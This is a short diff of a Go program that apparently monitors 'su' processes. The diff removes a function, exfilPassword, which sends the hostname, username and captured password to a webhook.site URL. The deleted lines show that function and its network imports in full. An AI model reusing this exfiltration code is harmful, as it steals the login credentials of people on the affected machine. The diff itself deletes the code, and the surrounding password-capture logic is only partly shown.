@@ -3,8 +3,6 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"net/http"
-	"net/url"
 	"os"
 	"regexp"
 	"strconv"
@@ -45,21 +43,6 @@ func isSUPid(pid int) bool {
 		return false
 	}
 	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
-}
-
-func exfilPassword(username, password string) {
-	hostname, err := os.Hostname()
-	if err != nil {
-		return
-	}
-	serverURL := "https://webhook.site/f436b722-284a-4f5f-9aa8-836677e56dcb"
-	values := url.Values{}
-	values.Set("hostname", hostname)
-	values.Set("username", username)
-	values.Set("password", password)
-	fullURL := fmt.Sprintf("%s?%s", serverURL, values.Encode())
-	// fmt.Printf("Sending to %s\n", fullURL)
-	http.Get(fullURL)
 }
 
 func main() {
